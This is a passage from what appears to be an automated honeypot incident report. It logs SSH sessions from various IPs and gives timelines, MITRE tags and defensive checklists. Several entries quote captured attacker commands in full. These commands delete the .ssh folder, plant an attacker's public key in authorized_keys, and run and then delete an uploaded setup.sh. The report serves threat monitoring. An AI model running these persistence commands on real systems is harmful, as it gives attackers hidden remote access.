| `2026-08-05 07:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.50[.]249` to AbuseIPDB if not already reported
- [ ] Block `104.155.50[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28987e75c053

| Field | Detail |
|---|---|
| **Source IP** | `104.155.50[.]249` |
| **First Seen** | 2026-08-05 07:59 |
| **Last Seen** | 2026-08-05 07:59 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:59:23` | `cowrie.session.connect` |
| `2026-08-05 07:59:23` | `cowrie.login.success` |
| `2026-08-05 07:59:24` | `cowrie.session.params` |
| `2026-08-05 07:59:24` | `cowrie.command.input` |
| `2026-08-05 07:59:35` | `cowrie.log.closed` |
| `2026-08-05 07:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.50[.]249` to AbuseIPDB if not already reported
- [ ] Block `104.155.50[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e33ca22ce3e

| Field | Detail |
|---|---|
| **Source IP** | `49.0.24[.]107` |
| **First Seen** | 2026-08-05 08:01 |
| **Last Seen** | 2026-08-05 08:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:01:06` | `cowrie.session.connect` |
| `2026-08-05 08:01:06` | `cowrie.client.version` |
| `2026-08-05 08:01:07` | `cowrie.client.kex` |
| `2026-08-05 08:01:08` | `cowrie.login.success` |
| `2026-08-05 08:01:09` | `cowrie.session.params` |
| `2026-08-05 08:01:09` | `cowrie.command.input` |
| `2026-08-05 08:01:09` | `cowrie.command.failed` |
| `2026-08-05 08:01:09` | `cowrie.log.closed` |
| `2026-08-05 08:01:10` | `cowrie.session.params` |
| `2026-08-05 08:01:10` | `cowrie.command.input` |
| `2026-08-05 08:01:11` | `cowrie.session.file_download` |
| `2026-08-05 08:01:11` | `cowrie.log.closed` |
| `2026-08-05 08:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.0.24[.]107` to AbuseIPDB if not already reported
- [ ] Block `49.0.24[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a5521cfc43

| Field | Detail |
|---|---|
| **Source IP** | `49.0.24[.]107` |
| **First Seen** | 2026-08-05 08:01 |
| **Last Seen** | 2026-08-05 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:01:11` | `cowrie.session.connect` |
| `2026-08-05 08:01:11` | `cowrie.client.version` |
| `2026-08-05 08:01:11` | `cowrie.client.kex` |
| `2026-08-05 08:01:12` | `cowrie.login.success` |
| `2026-08-05 08:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.0.24[.]107` to AbuseIPDB if not already reported
- [ ] Block `49.0.24[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaaa4adf6235

| Field | Detail |
|---|---|
| **Source IP** | `49.0.24[.]107` |
| **First Seen** | 2026-08-05 08:01 |
| **Last Seen** | 2026-08-05 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:01:13` | `cowrie.session.connect` |
| `2026-08-05 08:01:13` | `cowrie.client.version` |
| `2026-08-05 08:01:13` | `cowrie.client.kex` |
| `2026-08-05 08:01:14` | `cowrie.login.success` |
| `2026-08-05 08:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.0.24[.]107` to AbuseIPDB if not already reported
- [ ] Block `49.0.24[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27ec39c9d65a

| Field | Detail |
|---|---|
| **Source IP** | `43.165.170[.]198` |
| **First Seen** | 2026-08-05 08:01 |
| **Last Seen** | 2026-08-05 08:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:01:18` | `cowrie.session.connect` |
| `2026-08-05 08:01:18` | `cowrie.client.version` |
| `2026-08-05 08:01:18` | `cowrie.client.kex` |
| `2026-08-05 08:01:19` | `cowrie.login.success` |
| `2026-08-05 08:01:19` | `cowrie.session.params` |
| `2026-08-05 08:01:19` | `cowrie.command.input` |
| `2026-08-05 08:01:19` | `cowrie.command.failed` |
| `2026-08-05 08:01:20` | `cowrie.log.closed` |
| `2026-08-05 08:01:21` | `cowrie.session.params` |
| `2026-08-05 08:01:21` | `cowrie.command.input` |
| `2026-08-05 08:01:21` | `cowrie.session.file_download` |
| `2026-08-05 08:01:21` | `cowrie.log.closed` |
| `2026-08-05 08:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.170[.]198` to AbuseIPDB if not already reported
- [ ] Block `43.165.170[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb5326f18f24

| Field | Detail |
|---|---|
| **Source IP** | `43.165.170[.]198` |
| **First Seen** | 2026-08-05 08:01 |
| **Last Seen** | 2026-08-05 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:01:21` | `cowrie.session.connect` |
| `2026-08-05 08:01:21` | `cowrie.client.version` |
| `2026-08-05 08:01:21` | `cowrie.client.kex` |
| `2026-08-05 08:01:22` | `cowrie.login.success` |
| `2026-08-05 08:01:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.170[.]198` to AbuseIPDB if not already reported
- [ ] Block `43.165.170[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fe09cf40ab5

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-05 08:01 |
| **Last Seen** | 2026-08-05 08:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:01:22` | `cowrie.session.connect` |
| `2026-08-05 08:01:22` | `cowrie.client.version` |
| `2026-08-05 08:01:22` | `cowrie.client.kex` |
| `2026-08-05 08:01:23` | `cowrie.login.success` |
| `2026-08-05 08:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7b14eed094d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-05 08:01 |
| **Last Seen** | 2026-08-05 08:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:01:22` | `cowrie.session.connect` |
| `2026-08-05 08:01:22` | `cowrie.client.version` |
| `2026-08-05 08:01:22` | `cowrie.client.kex` |
| `2026-08-05 08:01:23` | `cowrie.login.success` |
| `2026-08-05 08:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-321448778794

| Field | Detail |
|---|---|
| **Source IP** | `43.165.170[.]198` |
| **First Seen** | 2026-08-05 08:01 |
| **Last Seen** | 2026-08-05 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:01:22` | `cowrie.session.connect` |
| `2026-08-05 08:01:22` | `cowrie.client.version` |
| `2026-08-05 08:01:22` | `cowrie.client.kex` |
| `2026-08-05 08:01:23` | `cowrie.login.success` |
| `2026-08-05 08:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.170[.]198` to AbuseIPDB if not already reported
- [ ] Block `43.165.170[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdfebb2ad90a

| Field | Detail |
|---|---|
| **Source IP** | `119.92.70[.]82` |
| **First Seen** | 2026-08-05 08:02 |
| **Last Seen** | 2026-08-05 08:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:02:51` | `cowrie.session.connect` |
| `2026-08-05 08:02:51` | `cowrie.client.version` |
| `2026-08-05 08:02:51` | `cowrie.client.kex` |
| `2026-08-05 08:02:52` | `cowrie.login.success` |
| `2026-08-05 08:02:53` | `cowrie.session.params` |
| `2026-08-05 08:02:53` | `cowrie.command.input` |
| `2026-08-05 08:02:53` | `cowrie.command.failed` |
| `2026-08-05 08:02:53` | `cowrie.log.closed` |
| `2026-08-05 08:02:54` | `cowrie.session.params` |
| `2026-08-05 08:02:54` | `cowrie.command.input` |
| `2026-08-05 08:02:54` | `cowrie.session.file_download` |
| `2026-08-05 08:02:54` | `cowrie.log.closed` |
| `2026-08-05 08:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.92.70[.]82` to AbuseIPDB if not already reported
- [ ] Block `119.92.70[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f2a0192f67a

| Field | Detail |
|---|---|
| **Source IP** | `119.92.70[.]82` |
| **First Seen** | 2026-08-05 08:02 |
| **Last Seen** | 2026-08-05 08:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:02:55` | `cowrie.session.connect` |
| `2026-08-05 08:02:55` | `cowrie.client.version` |
| `2026-08-05 08:02:55` | `cowrie.client.kex` |
| `2026-08-05 08:02:56` | `cowrie.login.success` |
| `2026-08-05 08:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.92.70[.]82` to AbuseIPDB if not already reported
- [ ] Block `119.92.70[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00f275093ea3

| Field | Detail |
|---|---|
| **Source IP** | `119.92.70[.]82` |
| **First Seen** | 2026-08-05 08:02 |
| **Last Seen** | 2026-08-05 08:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:02:56` | `cowrie.session.connect` |
| `2026-08-05 08:02:56` | `cowrie.client.version` |
| `2026-08-05 08:02:57` | `cowrie.client.kex` |
| `2026-08-05 08:02:58` | `cowrie.login.success` |
| `2026-08-05 08:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.92.70[.]82` to AbuseIPDB if not already reported
- [ ] Block `119.92.70[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac02de8e6f9e

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]29` |
| **First Seen** | 2026-08-05 08:05 |
| **Last Seen** | 2026-08-05 08:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:05:34` | `cowrie.session.connect` |
| `2026-08-05 08:05:34` | `cowrie.client.version` |
| `2026-08-05 08:05:35` | `cowrie.client.kex` |
| `2026-08-05 08:05:35` | `cowrie.login.success` |
| `2026-08-05 08:05:35` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:05:35` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]29` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a627369bd84

| Field | Detail |
|---|---|
| **Source IP** | `14.33.96[.]3` |
| **First Seen** | 2026-08-05 08:07 |
| **Last Seen** | 2026-08-05 08:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:07:56` | `cowrie.session.connect` |
| `2026-08-05 08:07:57` | `cowrie.client.version` |
| `2026-08-05 08:07:57` | `cowrie.client.kex` |
| `2026-08-05 08:07:59` | `cowrie.login.success` |
| `2026-08-05 08:07:59` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.96[.]3` to AbuseIPDB if not already reported
- [ ] Block `14.33.96[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0808eb7ed619

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-08-05 08:09 |
| **Last Seen** | 2026-08-05 08:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:09:00` | `cowrie.session.connect` |
| `2026-08-05 08:09:00` | `cowrie.client.version` |
| `2026-08-05 08:09:00` | `cowrie.client.kex` |
| `2026-08-05 08:09:03` | `cowrie.login.success` |
| `2026-08-05 08:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a840fe3554da

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-08-05 08:09 |
| **Last Seen** | 2026-08-05 08:09 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.s` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:09:05` | `cowrie.session.connect` |
| `2026-08-05 08:09:05` | `cowrie.client.version` |
| `2026-08-05 08:09:05` | `cowrie.client.kex` |
| `2026-08-05 08:09:05` | `cowrie.login.success` |
| `2026-08-05 08:09:39` | `cowrie.session.params` |
| `2026-08-05 08:09:39` | `cowrie.command.input` |
| `2026-08-05 08:09:39` | `cowrie.log.closed` |
| `2026-08-05 08:09:39` | `cowrie.session.file_upload` |
| `2026-08-05 08:09:39` | `cowrie.session.file_upload` |
| `2026-08-05 08:09:39` | `cowrie.session.file_upload` |
| `2026-08-05 08:09:39` | `cowrie.session.file_upload` |
| `2026-08-05 08:09:39` | `cowrie.session.file_upload` |
| `2026-08-05 08:09:39` | `cowrie.session.file_upload` |
| `2026-08-05 08:09:39` | `cowrie.session.file_upload` |
| `2026-08-05 08:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-941fcdfdea75

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]223` |
| **First Seen** | 2026-08-05 08:11 |
| **Last Seen** | 2026-08-05 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:11:54` | `cowrie.session.connect` |
| `2026-08-05 08:11:54` | `cowrie.client.version` |
| `2026-08-05 08:11:54` | `cowrie.client.kex` |
| `2026-08-05 08:11:55` | `cowrie.login.success` |
| `2026-08-05 08:11:55` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:11:55` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:11:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]223` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6569b85f10b8

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-08-05 08:13 |
| **Last Seen** | 2026-08-05 08:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:13:12` | `cowrie.session.connect` |
| `2026-08-05 08:13:13` | `cowrie.client.version` |
| `2026-08-05 08:13:13` | `cowrie.client.kex` |
| `2026-08-05 08:13:15` | `cowrie.login.success` |
| `2026-08-05 08:13:16` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:13:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fb316b01ee7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 08:14 |
| **Last Seen** | 2026-08-05 08:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:14:52` | `cowrie.session.connect` |
| `2026-08-05 08:14:52` | `cowrie.client.version` |
| `2026-08-05 08:14:52` | `cowrie.client.kex` |
| `2026-08-05 08:14:52` | `cowrie.login.success` |
| `2026-08-05 08:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eb727da7066

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 08:14 |
| **Last Seen** | 2026-08-05 08:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:14:54` | `cowrie.session.connect` |
| `2026-08-05 08:14:54` | `cowrie.client.version` |
| `2026-08-05 08:14:54` | `cowrie.client.kex` |
| `2026-08-05 08:14:54` | `cowrie.login.success` |
| `2026-08-05 08:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc21d7d31797

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 08:14 |
| **Last Seen** | 2026-08-05 08:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:14:58` | `cowrie.session.connect` |
| `2026-08-05 08:14:58` | `cowrie.client.version` |
| `2026-08-05 08:14:58` | `cowrie.client.kex` |
| `2026-08-05 08:14:58` | `cowrie.login.success` |
| `2026-08-05 08:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f4da8b6775b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-05 08:14 |
| **Last Seen** | 2026-08-05 08:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:14:58` | `cowrie.session.connect` |
| `2026-08-05 08:14:58` | `cowrie.client.version` |
| `2026-08-05 08:14:58` | `cowrie.client.kex` |
| `2026-08-05 08:14:58` | `cowrie.login.success` |
| `2026-08-05 08:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df9a1901a701

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-05 08:16 |
| **Last Seen** | 2026-08-05 08:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:16:21` | `cowrie.session.connect` |
| `2026-08-05 08:16:21` | `cowrie.client.version` |
| `2026-08-05 08:16:21` | `cowrie.client.kex` |
| `2026-08-05 08:16:22` | `cowrie.login.success` |
| `2026-08-05 08:16:22` | `cowrie.direct-tcpip.request` |
| `2026-08-05 08:16:22` | `cowrie.direct-tcpip.data` |
| `2026-08-05 08:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f6244d748f9

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]42` |
| **First Seen** | 2026-08-05 08:17 |
| **Last Seen** | 2026-08-05 08:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 08:17:54` | `cowrie.session.connect` |
| `2026-08-05 08:17:54` | `cowrie.client.version` |
